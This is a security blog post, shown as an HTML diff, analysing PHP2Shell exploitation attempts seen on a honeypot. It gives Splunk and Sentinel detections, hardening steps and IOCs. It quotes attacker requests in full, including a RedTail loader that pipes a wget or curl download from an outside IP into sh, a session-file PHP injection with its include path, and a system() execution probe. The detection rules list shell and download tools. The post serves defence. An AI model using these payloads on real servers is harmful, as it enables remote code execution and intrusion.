@@ -1,0 +1,371 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<title>Detecting PHP2Shell and Session Upload-Progress Attacks in Splunk and Sentinel | Global SOC</title>
+<link rel="canonical" href="https://globalsoc.com.au/blog/detect-php2shell/">
+<meta name="description" content="I exposed an unpatched PHP 8.3.35 container the day after PHP2Shell was disclosed. Scanners came within 21 hours, a RedTail operator tried to chain it with a session-file include, and one source drove PHP out of memory 16 times. Here&#x27;s the kill chain and the Splunk + CrowdStrike and Sentinel + Defender for Endpoint detections, plus one lesson about SIEM truncation I learned the hard way.">
+<meta property="og:site_name" content="Global SOC">
+<meta property="og:locale" content="en_AU">
+<meta property="og:type" content="article">
+<meta property="og:url" content="https://globalsoc.com.au/blog/detect-php2shell/">
+<meta property="og:title" content="Detecting PHP2Shell and Session Upload-Progress Attacks in Splunk and Sentinel | Global SOC">
+<meta property="og:description" content="I exposed an unpatched PHP 8.3.35 container the day after PHP2Shell was disclosed. Scanners came within 21 hours, a RedTail operator tried to chain it with a session-file include, and one source drove PHP out of memory 16 times. Here&#x27;s the kill chain and the Splunk + CrowdStrike and Sentinel + Defender for Endpoint detections, plus one lesson about SIEM truncation I learned the hard way.">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Detecting PHP2Shell and Session Upload-Progress Attacks in Splunk and Sentinel | Global SOC">
+<meta name="twitter:description" content="I exposed an unpatched PHP 8.3.35 container the day after PHP2Shell was disclosed. Scanners came within 21 hours, a RedTail operator tried to chain it with a session-file include, and one source drove PHP out of memory 16 times. Here&#x27;s the kill chain and the Splunk + CrowdStrike and Sentinel + Defender for Endpoint detections, plus one lesson about SIEM truncation I learned the hard way.">
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@graph": [
+    {
+      "@type": "BlogPosting",
+      "@id": "https://globalsoc.com.au/blog/detect-php2shell/#article",
+      "url": "https://globalsoc.com.au/blog/detect-php2shell/",
+      "mainEntityOfPage": {
+        "@type": "WebPage",
+        "@id": "https://globalsoc.com.au/blog/detect-php2shell/"
+      },
+      "headline": "PHP2Shell in the Wild: Detecting Upload-Progress Abuse, Startup Memory Exhaustion and the Shell That Follows",
+      "description": "I exposed an unpatched PHP 8.3.35 container the day after PHP2Shell was disclosed. Scanners came within 21 hours, a RedTail operator tried to chain it with a session-file include, and one source drove PHP out of memory 16 times. Here's the kill chain and the Splunk + CrowdStrike and Sentinel + Defender for Endpoint detections, plus one lesson about SIEM truncation I learned the hard way.",
+      "datePublished": "2026-11-10",
+      "author": {
+        "@type": "Person",
+        "name": "Yogesh"
+      },
+      "publisher": {
+        "@type": "Organization",
+        "@id": "https://globalsoc.com.au/#organization",
+        "name": "Global SOC",
+        "legalName": "Global SOC Pty Ltd",
+        "url": "https://globalsoc.com.au/"
+      },
+      "isPartOf": {
+        "@id": "https://globalsoc.com.au/blog/#blog"
+      },
+      "inLanguage": "en-AU"
+    },
+    {
+      "@type": "BreadcrumbList",
+      "itemListElement": [
+        {
+          "@type": "ListItem",
+          "position": 1,
+          "name": "Home",
+          "item": "https://globalsoc.com.au/"
+        },
+        {
+          "@type": "ListItem",
+          "position": 2,
+          "name": "Blog",
+          "item": "https://globalsoc.com.au/blog/"
+        },
+        {
+          "@type": "ListItem",
+          "position": 3,
+          "name": "PHP2Shell in the Wild: Detecting Upload-Progress Abuse, Startup Memory Exhaustion and the Shell That Follows",
+          "item": "https://globalsoc.com.au/blog/detect-php2shell/"
+        }
+      ]
+    }
+  ]
+}
+</script>
+<meta property="article:published_time" content="2026-11-10">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<meta name="author" content="Yogesh">
+<style>
+*{box-sizing:border-box}
+body{margin:0;background:#f5f7fa;color:#142333;font:17px/1.75 system-ui,sans-serif}
+header{background:#0b2436;color:white;padding:25px max(24px,calc((100vw - 1000px)/2))}
+header a{color:#a6e3ff;text-decoration:none}
+header a:hover{text-decoration:underline}
+main{max-width:1000px;margin:auto;padding:40px 24px 80px}
+h1{font-size:clamp(34px,5vw,52px);line-height:1.15;letter-spacing:-.035em;margin:16px 0 20px}
+h2{margin-top:52px;line-height:1.3;font-size:28px;border-bottom:1px solid #d6e1e9;padding-bottom:8px}
+h3{margin-top:32px;font-size:20px}
+p{max-width:82ch;margin:16px 0}
+pre{background:#10283a;color:#e3f2fc;padding:20px;border-radius:10px;overflow:auto;font:13.5px/1.65 Consolas,monospace;white-space:pre-wrap;overflow-wrap:anywhere}
+code{font-family:Consolas,monospace;background:#e9f0f5;color:#0b2436;padding:2px 6px;border-radius:4px;font-size:0.9em}
+pre code{background:transparent;color:inherit;padding:0}
+a{color:#076383}
+nav.toc{background:#e6f0f5;border-left:4px solid #087da4;padding:16px 22px;margin:24px 0}
+.meta{color:#47687c;font-size:14px;font-weight:600;letter-spacing:0.04em}
+table{width:100%;border-collapse:collapse;background:white;font-size:15px;margin:20px 0}
+td,th{padding:12px;border:1px solid #d6e1e9;text-align:left}
+th{background:#edf3f7}
+td code{overflow-wrap:anywhere}
+.alert-box{background:#f0fdf4;border-left:4px solid #16a34a;padding:16px 20px;border-radius:4px;margin:20px 0}
+.warn-box{background:#fef2f2;border-left:4px solid #dc2626;padding:16px 20px;border-radius:4px;margin:20px 0}
+@media(max-width:640px){table{font-size:12px}td,th{padding:6px}}
+.bar{fill:#087da4}.small{font-size:14px;color:#47687c}
+.org{display:inline-block;font:700 12px/1.6 system-ui,sans-serif;padding:1px 8px;border-radius:4px;margin-right:6px;letter-spacing:.03em;vertical-align:1px}
+.orgA{background:#fde7d9;color:#7a2e0b}.orgB{background:#dbeafe;color:#1e3a8a}
+.kc{display:inline-block;font:700 12px/1.6 system-ui,sans-serif;padding:1px 8px;border-radius:4px;margin-right:8px;background:#0b2436;color:#a6e3ff;vertical-align:3px;letter-spacing:.03em}
+ul,ol{max-width:82ch}li{margin:6px 0}
+</style>
+</head>
+<body>
+<header>
+  <div style="display:flex;justify-content:space-between;align-items:center;">
+    <div><a href="/">Global SOC</a> / <a href="/blog/">Blog</a></div>
+    <div><a href="/dnsaudit/">DNS Audit</a></div>
+  </div>
+</header>
+<main>
+<p class="meta">THREAT RESEARCH &amp; LABS · Yogesh · 10 November 2026</p>
+<h1>PHP2Shell in the Wild: Detecting Upload-Progress Abuse, Startup Memory Exhaustion and the Shell That Follows</h1>
+<p>I exposed an unpatched PHP 8.3.35 container the day after PHP2Shell was disclosed. Scanners came within 21 hours, a RedTail operator tried to chain it with a session-file include, and one source drove PHP out of memory 16 times. Here&#x27;s the kill chain and the Splunk + CrowdStrike and Sentinel + Defender for Endpoint detections, plus one lesson about SIEM truncation I learned the hard way.</p>
+<nav class="toc"><strong>Key Sections:</strong> What Hit the Server · The Attack, Step by Step · Pyramid of Pain · Web and Server-Log Detections · Endpoint Detections · When It Fires · Hardening · IOCs</nav>
+<p class="small">Part of my <a href="/blog/honeypot-detection-playbook/">honeypot detection series</a>. <span class="org orgA">Org A</span> runs Splunk with CrowdStrike Falcon. <span class="org orgB">Org B</span> runs Microsoft Sentinel with Defender for Endpoint. The web and PHP-error KQL ran against the honeypot's real logs. The endpoint queries are written from the payloads shown here, so adapt the field names to your environment.</p>
+
+<h2 id="what">1. What Hit the Server</h2>
+
+<p>PHP2Shell (CVE-2026-109618 and CVE-2026-109619) is a memory-management flaw in how PHP cleans up after a fatal error during request startup. Request startup is when PHP parses a multipart body into <code>$_POST</code> and <code>$_FILES</code>, before your script runs. So the bug is reachable on any PHP page that accepts a POST, whatever the application does.</p>
+
+<p>I put an unpatched PHP 8.3.35 container online the day after disclosure, deliberately easy to reach: a 2 MB memory limit, and upload progress left in the session file. Here's who came:</p>
+<ul>
+<li><strong>21 hours in:</strong> a scanner calling itself <code>php2shell-scan/3.1 (authorized-security-assessment)</code> checked whether upload progress was on.</li>
+<li><strong>Two hours later:</strong> a RedTail operator tried to plant PHP in a session file and include it. The request was malformed and couldn't work.</li>
+<li><strong>Five days in:</strong> one source sent 16 large multipart bodies, and PHP logged exactly 16 out-of-memory fatal errors during startup. That's the code path PHP2Shell abuses. No worker crashed.</li>
+<li><strong>Throughout:</strong> two other scanners and the BitSight internet census probed the same feature.</li>
+</ul>
+<p>Nothing executed. But the attempts show exactly which logs light up, and where they don't.</p>
+
+<h2 id="steps">2. The Attack, Step by Step</h2>
+
+<h3><span class="kc">Recon</span> Step 1: Is upload progress on?</h3>
+<p>The scanner's check is the minimum that makes PHP start tracking upload progress: a session ID, a <code>PHP_SESSION_UPLOAD_PROGRESS</code> field, then a one-byte file:</p>
+<pre><code>POST / HTTP/1.1
+User-Agent: php2shell-scan/3.1 (authorized-security-assessment)
+Content-Type: multipart/form-data; boundary=----p2s78581043
+
+------p2s78581043
+Content-Disposition: form-data; name="PHPSESSID"
+
+463abde02ef163a4d075ef88acafc965
+------p2s78581043
+Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"
+
+probe
+------p2s78581043
+Content-Disposition: form-data; name="f"; filename="a"
+
+Z
+------p2s78581043--
+</code></pre>
+<p>If the server writes a session file for that ID, the feature is live (T1595.002). One second later, the scanner "seeded" 15 likely PHP paths with fresh session IDs, to see which ones run PHP at all.</p>
+
+<h3><span class="kc">Exploit + Delivery</span> Step 2: Plant PHP in a session file, then include it</h3>
+<p>The RedTail operator's request, with 57 padding fields and the 16 KB file shortened:</p>
+<pre><code>POST /index.php HTTP/1.1
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Safari/537.36
+Content-Type: multipart/form-data; boundary=WebKitFormBoundaryk2my9i20
+
+Content-Disposition: form-data; name="PHPSESSID"
+
+bIDjFWKi9L5k8xKs-7FJjycGeDWFLzsi
+Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"
+
+&lt;?php echo '__START__'; system('(wget --no-check-certificate -qO- hxxps://217.60.102.5/sh || curl -sk hxxps://217.60.102.5/sh) | sh -s php2shell'); echo '__END__';?&gt;
+Content-Disposition: form-data; name="pad_0"
+
+hpye1ManlAdwwCutGEGj0yKNLXszyi8IwzAXcRE9z82DdUCBLIGUQxAiw0icVPPB
+Content-Disposition: form-data; name="pad_1"
+
+2CxCmzvH3LxuFm931sSAsam3pspzzotgGZjt2hWCHmUAIaJRGndejVbqsnxppus2
+Content-Disposition: form-data; name="pad_2"
+
+Oa2EiBC0eR4Jw4I3P8CJk4I7fdJNrlQ4CfzLy5ro8DFM1O1ze1SS0k1LKzFQLmQ9
+[... pad_3 to pad_55: 53 more fields of the same form, each 64 random letters and digits ...]
+Content-Disposition: form-data; name="pad_56"
+
+dz8asMBRpSKt8zdD066UmrUlsFEwGRVa5ztbr2S4Cmr7ZN0A9WMpbtbRMJvJcG9K
+--WebKitFormBoundaryk2my9i20
+Content-Disposition: form-data; name="file"; filename="data.bin"
+Content-Type: application/octet-stream
+
+bqhkQr8jbypj2sTTRfUnQdjL7g5z1464HSlzxvFnlhxZ7iYTV7ie09jvWCMak04SWI3yJYkNwvgmQbSRnECKZwszAQeCOfjc[... 16288 more random letters and digits; file data is 16384 bytes in total ...]
+--WebKitFormBoundaryk2my9i20--
+</code></pre>
+<p>The plan was to write PHP into <code>/tmp/sess_&lt;id&gt;</code> through upload progress, then include that file through a vulnerable <code>page</code> parameter within the same second (T1190, T1505.003):</p>
+<pre><code>04:53:56  POST /index.php                                                     200  23,757 bytes in
+04:53:57  GET  /index.php?page=/tmp/sess_bIDjFWKi9L5k8xKs-7FJjycGeDWFLzsi     200  285 bytes in
+04:54:38  POST /index.php                                                     200  21,112 bytes in
+04:54:38  GET  /index.php?page=/tmp/sess_-HUrVNNHqwWGPHlvr2w989UWD61HOQSL     200  285 bytes in
+04:55:19  POST /index.php                                                     200  21,342 bytes in
+04:55:20  GET  /index.php?page=/tmp/sess_aq7Xy0nVnZLxBzLXBhoEbzud6IhDcPw8     200  285 bytes in</code></pre>
+<p>The PHP runs RedTail's usual loader, tagged with this campaign:</p>
+<pre><code>(wget --no-check-certificate -qO- hxxps://217.60.102.5/sh || curl -sk hxxps://217.60.102.5/sh) | sh -s php2shell</code></pre>
+<p>It failed, and not because of my server. The text fields have no boundary lines in front of them, so PHP's parser threw them away. On a real application with an include bug, a correct version of this request is a one-shot RCE.</p>
+
+<h3><span class="kc">Exploit</span> Step 3: Drive PHP out of memory during startup</h3>
+<p>On 28 October, <code>2.59.133.151</code> sent 726 requests, almost all within two minutes. Among them were 16 multipart POSTs of 1.3 to 2.2 MB, in pairs. The container's PHP error log shows one fatal error for each:</p>
+<pre><code>[Wed Oct 28 01:48:42.451400 2026] [php:error] [pid 21:tid 21] [client 172.18.0.1:56708] PHP Fatal error:  Allowed memory size of 2097152 bytes exhausted (tried to allocate 4096 bytes) in Unknown on line 0
+172.18.0.1 - - [28/Oct/2026:01:48:42 +0000] "POST / HTTP/1.0" 200 364 "-" "-"
+[Wed Oct 28 01:48:43.562341 2026] [php:error] [pid 19:tid 19] [client 172.18.0.1:56710] PHP Fatal error:  Allowed memory size of 2097152 bytes exhausted (tried to allocate 4096 bytes) in Unknown on line 0
+172.18.0.1 - - [28/Oct/2026:01:48:43 +0000] "POST / HTTP/1.0" 200 364 "-" "-"</code></pre>
+<p><code>in Unknown on line 0</code> means no script was running yet. Memory ran out while PHP was parsing the request. That's the state PHP2Shell needs. The same worker PIDs then served normal requests seconds later, so nothing crashed, and nothing followed. My read is that it was a tool testing whether the target reaches the vulnerable state, and perhaps shaping memory before a real attempt (T1190).</p>
+
+<h3><span class="kc">Exploit</span> Step 4: Did the code run?</h3>
+<p>A third scanner, svs, puts <code>system(base64_decode("aWQ="))</code> (that's <code>id</code>) in the progress field, wrapped in split markers so the literal <code>svs_p2s_open</code> only appears if it executed:</p>
+<pre><code>POST / HTTP/1.1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36
+Content-Type: multipart/form-data; boundary=----svsP2sFormBoundary7Q1
+
+------svsP2sFormBoundary7Q1
+Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"
+
+&lt;?php echo "svs_p2s_" . "open"; system(base64_decode("aWQ=")); echo "svs_p2s_" . "close"; ?&gt;
+------svsP2sFormBoundary7Q1
+Content-Disposition: form-data; name="svs_probe"; filename="svs_probe.txt"
+Content-Type: text/plain
+
+svs
+------svsP2sFormBoundary7Q1--
+</code></pre>
+
+<h2 id="pyramid">3. Pyramid of Pain</h2>
+<table><thead><tr><th>Level</th><th>Indicator</th><th>What I'd do with it</th></tr></thead><tbody>
+<tr><td>IP / host</td><td>Loader <code>217.60.102[.]5</code>; <code>77.90.185.20</code> (which also brute-forced SSH)</td><td>Block. Same RedTail infrastructure as in the RedTail post.</td></tr>
+<tr><td>Network artefacts</td><td>User-Agent <code>php2shell-scan/3.1</code>; boundaries <code>----p2s…</code>, <code>----svsP2sFormBoundary…</code>; markers <code>__START__</code>, <code>svs_p2s_</code></td><td>Free to alert on, and free for them to change.</td></tr>
+<tr><td>Tools</td><td>Upload-progress field in a multipart POST; <code>page=/tmp/sess_…</code> right after</td><td>Detect the field and the include. Every variant of this technique needs both.</td></tr>
+<tr><td>TTPs</td><td>PHP startup OOM fatal errors in a burst; a PHP worker spawning a shell; PHP worker crashes</td><td>Highest value. These are what PHP2Shell <em>does</em> to a server, whatever the request looks like.</td></tr>
+</tbody></table>
+
+<h2 id="web">4. Web and Server-Log Detections</h2>
+<p>For Org B I've parsed the honeypot's nginx log into a <code>WebAccess</code> function. For Org A I've used raw nginx where the body matters, and the CIM <code>Web</code> data model otherwise.</p>
+<pre><code>let WebAccess = Syslog
+| where SyslogMessage startswith "php_http: "
+| extend j = parse_json(substring(SyslogMessage, 10))
+| project TimeGenerated, SrcIp = tostring(j.client), Method = tostring(j.method), Request = tostring(j.request),
+          Url = tostring(j.uri), Status = toint(j.status), BytesOut = toint(j.bytes_out),
+          UserAgent = tostring(j.user_agent), ContentType = tostring(j.content_type), Body = tostring(j.body);</code></pre>
+
+<h3>W1. Upload-progress field in a multipart POST</h3>
+<p><span class="org orgB">Org B</span> Tested: 36 requests from 17 sources. 3 had PHP or command code in the body.</p>
+<pre><code>WebAccess
+| where Method == "POST" and ContentType startswith "multipart/form-data"
+| where Body has "PHP_SESSION_UPLOAD_PROGRESS"
+| extend HasCode = Body has_any ("&lt;?php", "&lt;?=", "system(", "shell_exec", "base64_decode", "passthru")
+| summarize Requests = count(), Sources = dcount(SrcIp), WithCode = countif(HasCode), UAs = make_set(UserAgent, 10)</code></pre>
+<p><span class="org orgA">Org A</span></p>
+<pre><code>index=web sourcetype=nginx:access method=POST "multipart/form-data" "PHP_SESSION_UPLOAD_PROGRESS"
+| eval has_code=if(match(_raw, "&lt;\?php|&lt;\?=|system\(|shell_exec|base64_decode|passthru"), 1, 0)
+| stats count dc(clientip) as sources sum(has_code) as with_code values(http_user_agent) as uas</code></pre>
+<p>Real browsers almost never send this field. Some upload widgets do, so check your own apps first. With code in the field, it's high severity.</p>
+
+<h3>W2. Including a session file (T1505.003)</h3>
+<p><span class="org orgB">Org B</span> Tested: two sources. svs sent 18 (4 answered 200), and the RedTail operator sent 3 (all answered 200, all the normal page).</p>
+<pre><code>WebAccess
+| where Url contains "sess_" and (Url contains "/tmp/" or Url contains "../" or Url contains "%2Ftmp")
+| summarize Requests = count(), Answered200 = countif(Status == 200) by SrcIp</code></pre>
+<p><span class="org orgA">Org A</span></p>
+<pre><code>| tstats count from datamodel=Web where Web.url="*sess_*" (Web.url="*/tmp/*" OR Web.url="*../*" OR Web.url="*%2Ftmp*")
+    by Web.src Web.dest Web.status
+| rename Web.* as *</code></pre>
+<p>A request path containing <code>/tmp/sess_</code> has no innocent explanation. A 200 means the include parameter exists, so treat it as critical until you've confirmed the response is your normal page.</p>
+
+<h3>W3. PHP out of memory during startup: the PHP2Shell precondition</h3>
+<p><span class="org orgB">Org B</span> Tested: exactly the 16 errors from the 28 October burst, in two minutes. The PHP error log was the only place this showed up. The web log just showed POSTs answered 200.</p>
+<pre><code>Syslog
+| where SyslogMessage has "Allowed memory size" and SyslogMessage has "Unknown on line 0"
+| summarize Errors = count(), Hosts = dcount(Computer), FirstSeen = min(TimeGenerated), LastSeen = max(TimeGenerated) by ProcessName</code></pre>
+<p><span class="org orgA">Org A</span></p>
+<pre><code>index=web (sourcetype=apache:error OR sourcetype=php:error OR sourcetype="php-fpm")
+    "Allowed memory size" "Unknown on line 0"
+| bin _time span=5m
+| stats count as oom_errors values(client) as clients by _time host
+| where oom_errors &gt;= 3</code></pre>
+<p>Ship your PHP error log. Most people don't. A burst of startup OOMs from one client is either a PHP2Shell attempt or a badly broken upload client, and both are worth knowing about. Medium severity, raised to high if E1 or E2 fires on the same host.</p>
+
+<h3>W4. The lesson: check your SIEM isn't truncating the evidence</h3>
+<p>When I tested W1 and W2, the RedTail exploit POSTs were missing. The follow-up GETs were there, but not the 16 to 23 KB uploads. They had reached Sentinel, cut off at about 8 KB, which broke the JSON, so my parser silently dropped them. Big multipart bodies are exactly what this attack sends. Find out what your pipeline cuts:</p>
+<pre><code>Syslog
+| where SyslogMessage startswith "php_http: "
+| extend Parsed = parse_json(substring(SyslogMessage, 10))
+| where isnull(Parsed) or isempty(tostring(Parsed.client))
+| summarize Unparsed = count(), MaxLen = max(strlen(SyslogMessage)) by Computer</code></pre>
+<p>In Splunk, check <code>TRUNCATE</code> in <code>props.conf</code> for your web sourcetype (10,000 bytes by default). Either raise the limit, or log the size and the first part of the body as separate fields, so a cut-off record still parses.</p>
+
+<h2 id="endpoint">5. Endpoint Detections</h2>
+<h3>E1. PHP worker spawns a shell or downloader (T1059.004, T1105)</h3>
+<p><span class="org orgA">Org A</span></p>
+<pre><code>index=crowdstrike event_platform=Lin event_simpleName=ProcessRollup2
+    (ParentBaseFileName IN ("php","php-fpm*","apache2","httpd") OR GrandParentBaseFileName IN ("php","php-fpm*","apache2","httpd"))
+    FileName IN ("sh","bash","dash","wget","curl")
+| table _time ComputerName UserName ParentBaseFileName FileName CommandLine</code></pre>
+<p><span class="org orgB">Org B</span></p>
+<pre><code>DeviceProcessEvents
+| where Timestamp &gt; ago(7d)
+| where InitiatingProcessFileName in~ ("php","php-fpm","apache2","httpd")
+     or InitiatingProcessParentFileName in~ ("php","php-fpm","apache2","httpd")
+| where FileName in~ ("sh","bash","dash","wget","curl")
+| project Timestamp, DeviceName, AccountName, InitiatingProcessFileName, FileName, ProcessCommandLine</code></pre>
+<p>This is the same rule as in the RedTail post, because a successful PHP2Shell ends the same way. It's high severity on any PHP host.</p>
+
+<h3>E2. PHP or Apache workers crashing</h3>
+<p>Memory-corruption exploits rarely land first time. Failed attempts crash workers. My container had zero crashes. On a real server, two or more in ten minutes is worth a look.</p>
+<p><span class="org orgA">Org A</span></p>
+<pre><code>index=linux sourcetype=syslog ("segfault" OR "exit signal Segmentation fault" OR "general protection")
+    (process IN ("kernel") OR "apache2" OR "php-fpm" OR "httpd")
+| rex "(?&lt;proc&gt;apache2|php-fpm[\d.]*|httpd|php)\[(?&lt;pid&gt;\d+)\]"
+| bin _time span=10m
+| stats count as crashes values(proc) as procs by _time host
+| where crashes &gt;= 2</code></pre>
+<p><span class="org orgB">Org B</span></p>
+<pre><code>Syslog
+| where TimeGenerated &gt; ago(7d)
+| where SyslogMessage has_any ("segfault", "exit signal Segmentation fault", "general protection")
+| where SyslogMessage has_any ("apache2", "php-fpm", "httpd", "php")
+| summarize Crashes = count(), Sample = take_any(SyslogMessage) by Computer, bin(TimeGenerated, 10m)
+| where Crashes &gt;= 2</code></pre>
+
+<h3>E3. Payload fingerprints in the shell command line</h3>
+<p><span class="org orgA">Org A</span></p>
+<pre><code>index=crowdstrike event_platform=Lin event_simpleName=ProcessRollup2
+    FileName IN ("sh","bash","dash")
+    (CommandLine="*__START__*" OR CommandLine="*svs_p2s*" OR CommandLine="*-s php2shell*" OR CommandLine="*sh -s *")
+| table _time ComputerName UserName ParentBaseFileName CommandLine</code></pre>
+<p><span class="org orgB">Org B</span></p>
+<pre><code>DeviceProcessEvents
+| where Timestamp &gt; ago(7d)
+| where FileName in~ ("sh", "bash", "dash")
+| where ProcessCommandLine has_any ("__START__", "svs_p2s") or ProcessCommandLine matches regex @"\bsh\s+-s\s+\w+"
+| project Timestamp, DeviceName, AccountName, InitiatingProcessFileName, ProcessCommandLine</code></pre>
+<p><code>sh -s &lt;tag&gt;</code> fed from a pipe is how RedTail passes its campaign tag. Combined with the parent process from E1, it's a near-certain hit.</p>
+
+<h2 id="respond">6. When It Fires</h2>
+<ol>
+<li><strong>W1 or W2 only:</strong> check the PHP version. You need the fixed release for your branch (8.3.36 on 8.3). Check <code>session.upload_progress.enabled</code> too. If you're patched or it's off, close the alert.</li>
+<li><strong>W3:</strong> look for E1 and E2 on the same host in the same window. If neither fired, record the source and patch.</li>
+<li><strong>E1, E2 or E3:</strong> <span class="org orgA">Org A</span> Network-contain the host in Falcon. <span class="org orgB">Org B</span> Isolate it in Defender. List <code>/tmp/sess_*</code> files and look for PHP code in them. That's the planted payload, and it's still there afterwards.</li>
+<li><strong>Rebuild</strong> from a patched image and rotate anything PHP could read.</li>
+</ol>
+
+<h2 id="harden">7. Hardening</h2>
+<ul>
+<li>Patch PHP to the fixed release for your branch (8.3.36 on 8.3).</li>
+<li>Set <code>session.upload_progress.enabled=0</code> unless you use it. Almost nobody does.</li>
+<li>Keep <code>session.upload_progress.cleanup=1</code> (the default), and put <code>session.save_path</code> somewhere the web user can't include from.</li>
+<li>Fix include parameters. Never pass user input to <code>include</code> or <code>require</code>.</li>
+<li>Ship the PHP error log to your SIEM, and check that large web records aren't being truncated.</li>
+</ul>
+
+<h2 id="iocs">8. IOCs</h2>
+<table><thead><tr><th>Type</th><th>Value</th><th>Context</th></tr></thead><tbody>
+<tr><td>Second stage</td><td><code>hxxps://217.60.102[.]5/sh</code></td><td>RedTail loader, tag <code>php2shell</code></td></tr>
+<tr><td>RedTail operator</td><td><code>77.90.185.20</code></td><td>Session-file plant + include; also SSH brute force</td></tr>
+<tr><td>Memory exhaustion</td><td><code>2.59.133.151</code>, boundary <code>----lf…</code></td><td>16 startup OOMs on 28 Oct</td></tr>
+<tr><td>Scanners</td><td>UA <code>php2shell-scan/3.1</code>; boundary <code>----svsP2sFormBoundary7Q1</code>; path <code>/bitsight/internet_census/probe</code></td><td>Exposure checks</td></tr>
+<tr><td>Markers</td><td><code>__START__</code> / <code>__END__</code>, <code>svs_p2s_open</code> / <code>svs_p2s_close</code></td><td>Execution checks</td></tr>
+</tbody></table>
+<aside aria-label="Work with Global SOC" style="margin:40px 0 20px;padding:24px;border:1px solid #c8dce7;border-radius:12px;background:#e6f0f5;color:#142333"><h2 style="margin:0 0 12px">Have a project or security question?</h2><p>Talk to our Glen Waverley, Melbourne team about secure apps, DNS or email security.</p><a href="/#contact">Discuss your project with Global SOC &rarr;</a></aside></main>
+<footer>
+  <div style="max-width:1000px;margin:auto;padding:20px 24px;border-top:1px solid #d6e1e9;font-size:14px;color:#47687c;">
+    © 2026 Global SOC Pty Ltd · <a href="/privacy.html">Privacy Policy</a>
+  </div>
+</footer>
+<script src="https://globalsoc.com.au/v.js" defer></script>
+</body>
+</html>
